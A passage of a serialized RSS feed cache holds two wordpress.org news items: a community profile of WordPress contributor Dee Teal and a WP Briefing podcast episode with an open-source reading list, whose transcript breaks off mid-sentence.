\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:29:\"People of WordPress: Dee Teal\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:64:\"https://wordpress.org/news/2022/05/people-of-wordpress-dee-teal/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Tue, 31 May 2022 17:51:53 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:6:{i:0;a:5:{s:4:\"data\";s:9:\"Community\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:8:\"Features\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:2;a:5:{s:4:\"data\";s:7:\"General\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:3;a:5:{s:4:\"data\";s:10:\"Interviews\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:4;a:5:{s:4:\"data\";s:9:\"HeroPress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:5;a:5:{s:4:\"data\";s:19:\"People of WordPress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=12946\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:90:\"This month\'s People of WordPress feature shares the story of Dee Teal, based in Australia.\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:28:\"webcommsat AbhaNonStopNewsUK\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:14883:\"\n<p>In this series, we share some of the inspiring stories of how WordPress and its global network of contributors can change people&#8217;s lives for the better. This month we feature a WordPress development and large project specialist on the difference the software and community can make to your career and life.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img decoding=\"async\" loading=\"lazy\" width=\"1024\" height=\"515\" src=\"https://i2.wp.com/wordpress.org/news/files/2022/05/Dee-Teal.jpg?resize=1024%2C515&#038;ssl=1\" alt=\"\" class=\"wp-image-12955\" srcset=\"https://i2.wp.com/wordpress.org/news/files/2022/05/Dee-Teal.jpg?resize=1024%2C515&amp;ssl=1 1024w, https://i2.wp.com/wordpress.org/news/files/2022/05/Dee-Teal.jpg?resize=300%2C151&amp;ssl=1 300w, https://i2.wp.com/wordpress.org/news/files/2022/05/Dee-Teal.jpg?resize=768%2C386&amp;ssl=1 768w, https://i2.wp.com/wordpress.org/news/files/2022/05/Dee-Teal.jpg?w=1247&amp;ssl=1 1247w\" sizes=\"(max-width: 1000px) 100vw, 1000px\" data-recalc-dims=\"1\" /></figure>\n\n\n\n<p>Dee’s story with computers started at school in New Zealand where discovering how a mouse worked and learning BASIC and Pascal was a catalyst for what later became a programming career.</p>\n\n\n\n<p>At a time when computers were just becoming mainstream, there were no opportunities for girls in her school to consider this as a further option. She recalls: “No one thought to say, ‘Dee, you look like you’re good at this, you should pursue it…’. I mean, I was a girl (and I was told girls didn’t ‘do’ computers). No one in the circles I moved in really had any idea where this technology revolution would take us.”</p>\n\n\n\n<p>With no particular career path into technology, Dee was encouraged in her final year of school to apply for a job in a bank where she worked and became a teller three years later. She gained financial independence, which enabled her to travel as a 20-year-old and spend the next three years exploring the US and Europe.</p>\n\n\n\n<p>Looking back, she noted how the world had changed: the first computer mouse she had seen had come out in 1983, and 20 years later WordPress was founded.</p>\n\n\n\n<h2>Journey into coding</h2>\n\n\n\n<p>During those 20 years, Dee worked as a nanny, working in child care centers, in customer support, and as a temp.</p>\n\n\n\n<p>In 1999, she packed up her bags once again, and moved from New Zealand to Australia. She took a place at a performing arts school where she honed her singing and performance skills and volunteered her time to the music director who was starting to experiment with sending out HTML newsletters and updates via email.</p>\n\n\n\n<p>“And so my personal revolution began. On the day after I graduated from that course, I walked into a full-time role as that music director’s assistant and began my journey back to code.”</p>\n\n\n\n<p>As part of that job, Dee edited and sent HTML newsletters on a weekly basis. This ignited her interest in programming, and she bought books about coding for the web and experimented on her home-built PC making web pages. </p>\n\n\n\n<blockquote class=\"wp-block-quote\">\n<p>“I’m sure, like a lot of us, I remember the thrill of creating that first HTML file and seeing a ‘Hello World’ or similar heading rendered in the browser. From there, I was completely hooked.”</p>\n<cite>Dee Teal</cite></blockquote>\n\n\n\n<p>Later she moved to the IT department and took on maintenance of all the websites. By 2004, she was working full-time as a webmaster. A year later, she was running a small business creating sites on the side. Four years after that, her business became her full-time job as she left employment to pursue her Masters Degree in Digital Communication and Culture.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img decoding=\"async\" loading=\"lazy\" width=\"1024\" height=\"768\" src=\"https://i0.wp.com/wordpress.org/news/files/2022/05/R0011864.jpg?resize=1024%2C768&#038;ssl=1\" alt=\"Dee with other contributors getting things ready for a WordCamp\" class=\"wp-image-12961\" srcset=\"https://i0.wp.com/wordpress.org/news/files/2022/05/R0011864.jpg?resize=1024%2C768&amp;ssl=1 1024w, https://i0.wp.com/wordpress.org/news/files/2022/05/R0011864.jpg?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/wordpress.org/news/files/2022/05/R0011864.jpg?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/wordpress.org/news/files/2022/05/R0011864.jpg?w=1200&amp;ssl=1 1200w\" sizes=\"(max-width: 1000px) 100vw, 1000px\" data-recalc-dims=\"1\" /><figcaption class=\"wp-element-caption\">Dee and other volunteers setting up for a local WordCamp</figcaption></figure>\n\n\n\n<p>Dee found the theory and sociology behind the web, and its facilitation of human and machine communication fascinating.</p>\n\n\n\n<p>She said: “I love the fact that the tech industry involves a constant constant curve of growth and discovery, which results in a perpetual exercise in finding creative elegant solutions for sticky problems.”</p>\n\n\n\n<p>For Dee, being able to use her innate curiosity to leverage processes, people, and tools, fuelled by a focus on communicating a message, has been a defining inspiration in her work.</p>\n\n\n\n<p>This combined fascination coincided with her meeting WordPress in 2009 and subsequently its community. She moved her existing blog to the software and it became the CMS of choice for all her client work.</p>\n\n\n\n<h2>The WordPress community can change your world</h2>\n\n\n\n<p>In 2011, she stumbled across WordCamps and by extension the WordPress community. Dee has reflected publicly that WordPress didn’t change her life, its community changed her world!</p>\n\n\n\n<p>She flew on a whim from her then home in Sydney to attend a WordCamp in Melbourne she had found after a search for ‘WordPress Conferences’.</p>\n\n\n\n<p>She said: “I met welcoming people, made friends, connected, and came back home excited and hopeful about continuing this connection with the wider WordPress community.”</p>\n\n\n\n<p>Building a community locally around WordPress got off to a slow start in Sydney. From an inauspicious early WordPress Sydney meetup in the function room of a pub, her connection and involvement took off. Before long she was helping organize that meetup, and by the time she moved away from that great city it had branched into two meetups, and soon after, into three.</p>\n\n\n\n<p>She was so inspired by the community that at the end of that first year and her second WordCamp, she raised her hand to help organize a WordCamp Sydney in 2012, and after moving interstate, WordCamp Melbourne in 2013.</p>\n\n\n\n<blockquote class=\"wp-block-quote\">\n<p>&#8220;WordPress and any other software package exist to serve people.&#8221;</p>\n<cite>Dee Teal</cite></blockquote>\n\n\n\n<p>Dee said: “WordPress, software, technology, the Internet will come and go, morph, and change, evolve. Maybe WordPress will last forever, maybe it will morph into something else, maybe one day it will look completely different than it did when I first started (actually, that’s true now). The thing that doesn’t change is the humanity around it. WordPress and any other software package exist to serve people.”</p>\n\n\n\n<p>She added: “The thing that I have learned, not only through WordPress but in life, is that if we too serve the people around what we’re doing, we ourselves will grow, develop and change alongside the people we serve, and the tools we use to serve them.”</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img decoding=\"async\" loading=\"lazy\" width=\"1024\" height=\"329\" src=\"https://i0.wp.com/wordpress.org/news/files/2022/05/Dee_POW_5.6_slice-large.png?resize=1024%2C329&#038;ssl=1\" alt=\"Dee pictured second from left as part of the WordPress 5.6 contributors\" class=\"wp-image-12957\" srcset=\"https://i0.wp.com/wordpress.org/news/files/2022/05/Dee_POW_5.6_slice-large.png?resize=1024%2C329&amp;ssl=1 1024w, https://i0.wp.com/wordpress.org/news/files/2022/05/Dee_POW_5.6_slice-large.png?resize=300%2C96&amp;ssl=1 300w, https://i0.wp.com/wordpress.org/news/files/2022/05/Dee_POW_5.6_slice-large.png?resize=768%2C246&amp;ssl=1 768w, https://i0.wp.com/wordpress.org/news/files/2022/05/Dee_POW_5.6_slice-large.png?w=1200&amp;ssl=1 1200w\" sizes=\"(max-width: 1000px) 100vw, 1000px\" data-recalc-dims=\"1\" /><figcaption class=\"wp-element-caption\">Some of the contributors to the <em>WordPress 5.6 release</em> </figcaption></figure>\n\n\n\n<p>Dee was a coordinator for WordPress 5.6 release in 2020 and was able to encourage others to learn about the process.</p>\n\n\n\n<h2>Helping others and sharing knowledge through WordPress</h2>\n\n\n\n<p>Dee has been an advocate for cross-cultural collaboration and understanding in both WordPress and her work for a large distributed agency which has people from more than 24 countries and operates across 16 timezones. She has also written about closing the gap between diverse distributed teams and how to meet the challenges of cross cultural remote work.</p>\n\n\n\n<p>Dee has given talks at WordCamps, including at WordCamp Europe in 2019, on developing ourselves, our relationships, and our communities in increasingly diverse environments.</p>\n\n\n\n<p>With a strong desire to share her professional knowledge and experience, Dee hopes her involvement in the WordPress community from being part of a Release Squad in the Core Team, and volunteering in the community through organizing and speaking at WordCamp events, will inspire others to get involved.</p>\n\n\n\n<blockquote class=\"wp-block-quote\">\n<p>&#8220;It’s the connections, it’s the friendships. It’s the network of work, referrals, support, help and encouragement.&#8221;</p>\n<cite>Dee Teal talking about the community that makes WordPress specialbenefits of the WordPress community</cite></blockquote>\n\n\n\n<figure class=\"wp-block-image size-large\"><img decoding=\"async\" loading=\"lazy\" width=\"1024\" height=\"576\" src=\"https://i1.wp.com/wordpress.org/news/files/2022/05/dee-wceu2019.png?resize=1024%2C576&#038;ssl=1\" alt=\"Dee Teal\'s talk at WordCamp Europe 2019 on \'Working a world apart\'\" class=\"wp-image-12958\" srcset=\"https://i1.wp.com/wordpress.org/news/files/2022/05/dee-wceu2019.png?resize=1024%2C576&amp;ssl=1 1024w, https://i1.wp.com/wordpress.org/news/files/2022/05/dee-wceu2019.png?resize=300%2C169&amp;ssl=1 300w, https://i1.wp.com/wordpress.org/news/files/2022/05/dee-wceu2019.png?resize=768%2C432&amp;ssl=1 768w, https://i1.wp.com/wordpress.org/news/files/2022/05/dee-wceu2019.png?resize=1536%2C864&amp;ssl=1 1536w, https://i1.wp.com/wordpress.org/news/files/2022/05/dee-wceu2019.png?w=1920&amp;ssl=1 1920w\" sizes=\"(max-width: 1000px) 100vw, 1000px\" data-recalc-dims=\"1\" /><figcaption class=\"wp-element-caption\"><em>Dee shared her experience with attendees at WordCamp Europe 2019</em></figcaption></figure>\n\n\n\n<p>In contributing to WordPress and organizing community events around it, Dee found that for her: “At the end of the day it isn’t actually WordPress that matters. It’s those connections, it’s the friendships. It’s the network of work, referrals, support, help, encouragement that has kept me wired into this community and committed to helping other people find that connection and growth for themselves.”</p>\n\n\n\n<p>Dee’s career in WordPress has moved through coding, into project management of large scale WordPress projects, and now into delivery leadership. Her connections to community have helped &#8216;fuel the transitions&#8217; through these chapters of her life.</p>\n\n\n\n<p>She said: “I believe that the place I’ve found and the opportunities I have had owe as much to my own desire and ambition as they do to the help, support and belief of the community around me; sometimes even more than I’ve felt in myself.”</p>\n\n\n\n<p>She feels that she is ‘living proof’ that by helping, connecting, and resourcing other people, you can be helped, resourced and connected into places you had never thought possible.</p>\n\n\n\n<p>This has enabled her to reach and have a career in technology that she did not know existed as a teenager playing with that first computer mouse and experimenting with code. Dee hopes her story will inspire others in their journey.</p>\n\n\n\n<h2>Share the stories</h2>\n\n\n\n<p>Help share these stories of open source contributors and continue to grow the community. Meet more WordPressers in the <a href=\"https://wordpress.org/news/category/newsletter/interviews/\">People of WordPress series</a>.</p>\n\n\n\n<h2>Contributors</h2>\n\n\n\n<p>Thanks to Abha Thakor (<a href=\'https://profiles.wordpress.org/webcommsat/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>webcommsat</a>), Meher Bala (<a href=\'https://profiles.wordpress.org/meher/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>meher</a>), Chloe Bringmann (<a href=\'https://profiles.wordpress.org/cbringmann/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>cbringmann</a>), Nalini Thakor (<a href=\'https://profiles.wordpress.org/nalininonstopnewsuk/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>nalininonstopnewsuk</a>), and Larissa Murillo (<a href=\'https://profiles.wordpress.org/lmurillom/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>lmurillom</a>) for work on this feature. Thank you to Josepha Haden (<a href=\'https://profiles.wordpress.org/chanthaboune/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>chanthaboune</a>) and Topher DeRosia (<a href=\'https://profiles.wordpress.org/topher1kenobe/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>topher1kenobe</a>) for support of the series. Thank you too to <a href=\'https://profiles.wordpress.org/thewebprincess/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>thewebprincess</a> for sharing her experiences.</p>\n\n\n\n<p>This article is inspired by an article originally published on HeroPress.com, a community initiative created by Topher DeRosia. It highlights people in the WordPress community who have overcome barriers and whose stories would otherwise go unheard.<br>Meet more WordPress community members in our People of WordPress series.</p>\n\n\n\n<div class=\"wp-block-media-text is-stacked-on-mobile is-vertically-aligned-center\" style=\"grid-template-columns:29% auto\"><figure class=\"wp-block-media-text__media\"><img decoding=\"async\" loading=\"lazy\" width=\"180\" height=\"135\" src=\"https://i1.wp.com/wordpress.org/news/files/2020/03/heropress_logo_180.png?resize=180%2C135&#038;ssl=1\" alt=\"HeroPress logo\" class=\"wp-image-8409 size-full\" data-recalc-dims=\"1\" /></figure><div class=\"wp-block-media-text__content\">\n<p class=\"has-small-font-size\"><em>This People of WordPress feature is inspired by an essay originally published on </em><a href=\"https://heropress.com/\"><em>HeroPress.com</em></a><em>, a community initiative created by Topher DeRosia. It highlights people in the WordPress community who have overcome barriers and whose stories might otherwise go unheard. </em>#HeroPress </p>\n</div></div>\n\n\n\n<p></p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"12946\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:29;a:6:{s:4:\"data\";s:61:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:7:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:52:\"WP Briefing: Episode 32: An Open Source Reading List\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:74:\"https://wordpress.org/news/2022/05/episode-32-an-open-source-reading-list/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Mon, 30 May 2022 17:00:00 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:7:\"Podcast\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:11:\"wp-briefing\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:53:\"https://wordpress.org/news/?post_type=podcast&p=12940\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:448:\"In the thirty-second episode of the WordPress Briefing, WordPress Executive Director Josepha Haden Chomphosy shares her open source reading list for that post-WordCamp Europe downtime. Have a question you&#8217;d like answered? You can submit them to wpbriefing@wordpress.org, either written or as a voice recording. Credits Editor:&#160;Dustin Hartzler Logo:&#160;Beatriz Fialho Production:&#160;Santana Inniss and Chloé Bringmann Song: [&#8230;]\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:9:\"enclosure\";a:1:{i:0;a:5:{s:4:\"data\";s:0:\"\";s:7:\"attribs\";a:1:{s:0:\"\";a:3:{s:3:\"url\";s:60:\"https://wordpress.org/news/files/2022/05/WP-Briefing-032.mp3\";s:6:\"length\";s:1:\"0\";s:4:\"type\";s:0:\"\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"Santana Inniss\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:11975:\"\n<p>In the thirty-second episode of the WordPress Briefing, WordPress Executive Director Josepha Haden Chomphosy shares her open source reading list for that post-WordCamp Europe downtime. <br></p>\n\n\n\n<p><em><strong>Have a question you&#8217;d like answered? You can submit them to <a href=\"mailto:wpbriefing@wordpress.org\">wpbriefing@wordpress.org</a>, either written or as a voice recording.</strong></em></p>\n\n\n\n<h2 id=\"credits\">Credits</h2>\n\n\n\n<ul><li>Editor:&nbsp;<a href=\"https://profiles.wordpress.org/dustinhartzler/\">Dustin Hartzler</a></li><li>Logo:&nbsp;<a href=\"https://profiles.wordpress.org/beafialho/\">Beatriz Fialho</a></li><li>Production:&nbsp;<a href=\"https://profiles.wordpress.org/santanainniss/\">Santana Inniss</a> and <a href=\"https://profiles.wordpress.org/cbringmann/\">Chloé Bringmann</a></li><li>Song: Fearless First by Kevin MacLeod</li></ul>\n\n\n\n<h2>References</h2>\n\n\n\n<ul><li><a href=\"https://producingoss.com/en/index.html\">Producing Open Source Software</a>, Karl Fogel</li><li><a href=\"https://www.amazon.com/dp/B08BDGXVK9/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1\">Working in Public: The Making and Maintenance of Open Source Software</a>, Nadia Eghbal</li><li><a href=\"https://www.amazon.com/CODE-Collaborative-Ownership-Digital-Leonardo/dp/0262572362\">Collaborative Ownership and the Digital Economy</a>, ed Rishab Aiyer Ghosh, Roger F. Malina PhD, Sean Cubitt</li><li><a href=\"https://www.amazon.com/Humble-Inquiry-Second-Relationships-Organizations/dp/B08VCRL6WQ/ref=sr_1_1?crid=39U1NLFRD52VO&amp;keywords=Humble+Inquiry&amp;qid=1653587884&amp;s=books&amp;sprefix=humble+inquiry%2Cstripbooks%2C63&amp;sr=1-1\">Humble Inquiry</a>, Edgar H. Schein (Author), Peter A. Schein</li><li><a href=\"https://github.com/WordPress/book/\">WordPress Milestones</a></li><li><a href=\"https://europe.wordcamp.org/2022/\">WordCamp Europe 2022</a></li><li><a href=\"https://wp.me/p2U65r-9f3\">2022 Annual Meetup Survey</a></li></ul>\n\n\n\n<h2>Transcript</h2>\n\n\n\n<span id=\"more-12940\"></span>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:00:00]&nbsp;</strong></p>\n\n\n\n<p>Hello everyone. And welcome to the WordPress Briefing. The podcast where you can catch quick explanations of some of the ideas behind the WordPress open source project and the community around it. As well as get a small list of big things coming up in the next two weeks. I&#8217;m your host Josepha Haden Chomphosy. Here we go!</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:00:40]&nbsp;</strong></p>\n\n\n\n<p>With the approach of various mid-year breaks and the prospect of wandering off for some safe, restorative travel, I&#8217;ve been updating my to-read and re-read list. As I was looking at the queued books for my Northern hemisphere summer, there were some common threads, mostly around leadership, but there&#8217;s also like a chunk that&#8217;s about cross-cultural group theory and economics, and then like some beach reads, but there&#8217;s one group in particular that you all might find interesting.</p>\n\n\n\n<p>And that&#8217;s a group that&#8217;s sort of like a back-to-FOSS basics list. So I&#8217;ll share my top few with you in case you want to pack a copy for your next getaway.&nbsp;</p>\n\n\n\n<p>The first one on our list is called Producing Open Source Software by Karl Fogel. I think everyone who contributes to FOSS projects has received this as one of their first recommendations. Like, y&#8217;all are building open software? Excellent, you need to read Producing Open Source Software. Like, that is just a sentence that comes out of everyone&#8217;s mouths. So this was one of the first open source books that was recommended to me when I joined the WordPress community. It was freshly revised in 2020, and I haven&#8217;t given it a read since then, which is why it is on my reread list this year.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:01:54]</strong></p>\n\n\n\n<p>However, it shaped the early days of the WordPress project’s leadership, and their lead developers, and some of WordPress&#8217;s basic philosophies. It&#8217;s all available online, under a creative commons, ShareAlike license. And so it&#8217;s worth the read. I&#8217;ll put a link to it in the show notes so it&#8217;s easy for everyone to find in the event that is your preferred beach read.</p>\n\n\n\n<p>The second one on this list is a book from Nadia Eghbal. She wrote the excellent Roads and Bridges report that also is probably not light beach reading, but you know, this one is on my list to read this summer because Eghbal always delivers truths about the reality of maintaining popular software, popular, open source software, in a way that&#8217;s easy for me to access and process rather than getting paralyzed by the enormity of it all.</p>\n\n\n\n<p>For what it&#8217;s worth your mileage may vary on that. I realized that, like, I live and breathe open source stuff. And so just because I am not paralyzed by the enormity of her explanations of things doesn&#8217;t necessarily mean that you will have a similar experience. And so I&#8217;m just going to claim that elephant in the room for all of us.</p>\n\n\n\n<p>However, if you only read one book on this list this year, I think that this should be the one that you read.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:03:14]</strong></p>\n\n\n\n<p>The third one is called Code: Collaborative Ownership and the Digital Economy. It was edited by Rishab Aiyer Ghosh. I am certain that I butchered that name. And so I apologize on my own behalf to everyone that knows whether or not I said it correctly.</p>\n\n\n\n<p>This book focuses on intellectual property rights and the original purpose of having anything like copyright in the world. So, right up my alley! The writers who contributed to this work promise exploration of the plight of creativity in the commons, the role of sharing in creative advancement, and a concept of what it would look like if intellectual property were to mean the second closing of an ecosystem versus a triumph of the commons.</p>\n\n\n\n<p>I mean, obviously, this one is very light reading. You can take this topic to high tea and everyone will not know what you&#8217;re talking about. However, this one looks like a really interesting book to me and I am just super ready to read it.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:04:19]</strong></p>\n\n\n\n<p>The second to last one on the list is a book called Humble Inquiry.</p>\n\n\n\n<p>This is a new-to-me book that seems right in line with one of my favorite books to recommend to leaders in the open source space. From reviews of it, I have gathered that it takes a hard look at the value of listening and asking for clarification in a world that puts a high value on an unsolicited hot take.</p>\n\n\n\n<p>It puts the importance of high trust relationship building, which is at the heart of any cross-culturally aware organization. And for folks who&#8217;ve been working with me for a while, you know, that relationship building is an important part of my leadership expectations for myself. So it puts relationship building at the front and center with a promise of practical applications for everyday life.</p>\n\n\n\n<p>And if you ever have tried to tackle a complicated topic like this, you know that practical applications are really hard to come by and it&#8217;s often hard to understand it if you don&#8217;t have those practical applications. And so that is why this one is on my read and reread list this year.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:05:24]</strong></p>\n\n\n\n<p>And then finally the WordPress Milestones book.</p>\n\n\n\n<p>So this sounds like a shameless plug for WordPress. And on the one hand, this whole podcast is about WordPress. And so, yes! But on the other hand, I actually am reading this for two specific reasons. I&#8217;m rereading this actually. I read it when I first joined Automattic. And so the first of the two reasons that I&#8217;m rereading it this year is that volume two of this is, like the second decade of WordPress currently, being researched and written in preparation for WordPress’s 20th birthday next year.&nbsp;</p>\n\n\n\n<p>So I am rereading this to kind of get that all back in my mind as that work is getting done. And the second reason is that I honestly like to remind myself of how far we&#8217;ve come sometimes. I talk about our work frequently. And I talk about what we&#8217;re working on right now, all the time.</p>\n\n\n\n<p>I talk about what we&#8217;re looking at three years from now, five years from now. The biggest concerns of today, tomorrow, and the future-future. And it&#8217;s very easy to forget how much success WordPress has had and how much growth the contributors that support us have had over the course of our long and storied history.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:06:40]</strong></p>\n\n\n\n<p>And so I like to go back to that just to kind of give myself some grounding in our progress, as well as get some concept for how we can move forward together. So that one is also available online. Also under a creative commons ShareAlike license and it is also worth the read. I will share a link to that with the other one in the show notes as well.</p>\n\n\n\n<p>That brings us now to our small list of big things. Let&#8217;s see what we got in the old lineup today.&nbsp;</p>\n\n\n\n<p>So, firstly WordCamp Europe is happening this week and it&#8217;s possible to watch the live stream from the comfort of your own home. There are some smart and talented speakers at the event. So I encourage you to catch a few if you have the time. I&#8217;ll include a link to the live stream information in the show notes below, and then also you can always keep an eye out on Twitter.&nbsp;</p>\n\n\n\n<p>There will be a lot of discussions, a lot of conversation there. And so you can engage with folks that are there at the time and catch up on those conversations, catch up on those presentations in your own time, as it fits into your day.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:07:50]</strong></p>\n\n\n\n<p>The second thing is that WordPress’s community team is preparing the annual meetup survey right now. So if you participate in meetup events, keep an eye out for that because your feedback helps us to make plans to improve that program so that it works better for you. And it helps you to learn WordPress better and feel more confident with what you are taking out into the world that way.</p>\n\n\n\n<p>But, if you are wanting to use this as a chance to contribute, we actually will need folks who are able to translate the surveys as well. So I&#8217;ll leave a link to some information about that in the show notes. If all of that stuff about contribution didn&#8217;t make any sense, then just like keep an eye out from your meetup organizer and they will make sure that you have that survey so that you can have your voice heard.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:08:33]</strong></p>\n\n\n\n<p>And then item three is less of an item. I mean, it&#8217;s an item cause it&#8217;s in this list, but it&#8217;s less of, like, a thing to know and more of a general thing to be aware of. It&#8217;s a general awareness item. There&#8217;s a lot going on in WordPress right now. I can see how hard it is to keep track of some of these things these days.</p>\n\n\n\n<p>And I know as someone who&#8217;s looking at this all day every day that, yeah, it&#8217;s a lot. And it&#8217;s hard to get your bearings. So if you have a team that you contribute to already, don&#8217;t forget to reach out to each other, just to check-in. Sometimes we don&#8217;t think to ask for help. Sometimes we don&#8217;t think to offer help and you know, if no one needs any help from you at that moment, a little hello also can brighten someone&#8217;s day.</p>\n\n\n\n<p>And that, my friends, is your smallest of big things. Thank you for tuning in today for the WordPress Briefing. I&#8217;m your host, Josepha Haden Chomphosy. And I&#8217;ll see you again in a couple of 